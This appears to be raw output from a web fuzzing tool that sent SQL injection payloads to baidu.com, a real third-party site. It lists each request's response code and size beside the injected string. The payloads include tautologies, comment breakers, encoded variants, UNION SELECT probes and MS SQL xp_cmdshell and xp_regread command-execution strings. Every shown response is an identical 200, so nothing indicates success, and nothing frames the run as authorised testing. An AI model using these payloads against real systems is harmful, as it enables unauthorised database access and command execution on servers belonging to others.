Target: http://baidu.com/
Total requests: 125
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200      3 L         5 W           81 Ch        "'"
00003:  C=200      3 L         5 W           81 Ch        "#"
00007:  C=200      3 L         5 W           81 Ch        "--';"
00031:  C=200      3 L         5 W           81 Ch        "or 0=0 #"
00015:  C=200      3 L         5 W           81 Ch        "\x3D%20\x27"
00034:  C=200      3 L         5 W           81 Ch        "' or '1'='1'--"
00035:  C=200      3 L         5 W           81 Ch        ""' or 1 --'""
00036:  C=200      3 L         5 W           81 Ch        "or 1=1--"
00038:  C=200      3 L         5 W           81 Ch        "or%201=1 --"
00037:  C=200      3 L         5 W           81 Ch        "or%201=1"
00033:  C=200      3 L         5 W           81 Ch        "" or 1=1--"
00030:  C=200      3 L         5 W           81 Ch        "" or 0=0 #"
00032:  C=200      3 L         5 W           81 Ch        "' or 1=1--"
00029:  C=200      3 L         5 W           81 Ch        "' or 0=0 #"
00028:  C=200      3 L         5 W           81 Ch        "or 0=0 --"
00039:  C=200      3 L         5 W           81 Ch        "' or 1=1 or ''='"
00027:  C=200      3 L         5 W           81 Ch        "" or 0=0 --"
00026:  C=200      3 L         5 W           81 Ch        "' or 0=0 --"
00025:  C=200      3 L         5 W           81 Ch        "0 or 1=1"
00024:  C=200      3 L         5 W           81 Ch        "')%20or%20('x'='x"
00023:  C=200      3 L         5 W           81 Ch        ""%20or%20"x"="x"
00022:  C=200      3 L         5 W           81 Ch        "'%20or%20'x'='x"
00021:  C=200      3 L         5 W           81 Ch        "'%20or%20''='"
00020:  C=200      3 L         5 W           81 Ch        "<>"'%;)(&+"
00019:  C=200      3 L         5 W           81 Ch        "admin'--"
00018:  C=200      3 L         5 W           81 Ch        "'or%20select *"
00017:  C=200      3 L         5 W           81 Ch        "\x27\x6F\x72 SELECT *"
00014:  C=200      3 L         5 W           81 Ch        "\x3D%20\x3B'"
00016:  C=200      3 L         5 W           81 Ch        "\x27\x4F\x52 SELECT *"
00013:  C=200      3 L         5 W           81 Ch        "\x27"
00012:  C=200      3 L         5 W           81 Ch        "\x23"
00010:  C=200      3 L         5 W           81 Ch        "=%20;"
00011:  C=200      3 L         5 W           81 Ch        "=%20--"
00009:  C=200      3 L         5 W           81 Ch        "=%20'"
00006:  C=200      3 L         5 W           81 Ch        "'%20--"
00008:  C=200      3 L         5 W           81 Ch        "'%20;"
00002:  C=200      3 L         5 W           81 Ch        """
00005:  C=200      3 L         5 W           81 Ch        "--"
00004:  C=200      3 L         5 W           81 Ch        "-"
00040:  C=200      3 L         5 W           81 Ch        "" or 1=1 or ""=""
00042:  C=200      3 L         5 W           81 Ch        "" or "a"="a"
00046:  C=200      3 L         5 W           81 Ch        "hi" or 1=1 --"
00054:  C=200      3 L         5 W           81 Ch        "PRINT"
00070:  C=200      3 L         5 W           81 Ch        "replace"
00089:  C=200      3 L         5 W           81 Ch        "' (select top 1"
00088:  C=200      3 L         5 W           81 Ch        "' or (EXISTS)"
00087:  C=200      3 L         5 W           81 Ch        "' UNION ALL SELECT"
00086:  C=200      3 L         5 W           81 Ch        "' UNION SELECT"
00085:  C=200      3 L         5 W           81 Ch        "\x27UNION SELECT"
00084:  C=200      3 L         5 W           81 Ch        "--sp_password"
00083:  C=200      3 L         5 W           81 Ch        "t'exec master..xp_cmdshell 'nslookup www.google.com'--"
00081:  C=200      3 L         5 W           81 Ch        "'; exec master..xp_cmdshell"
00082:  C=200      3 L         5 W           81 Ch        "'; exec xp_regread"
00080:  C=200      3 L         5 W           81 Ch        "exec sp"
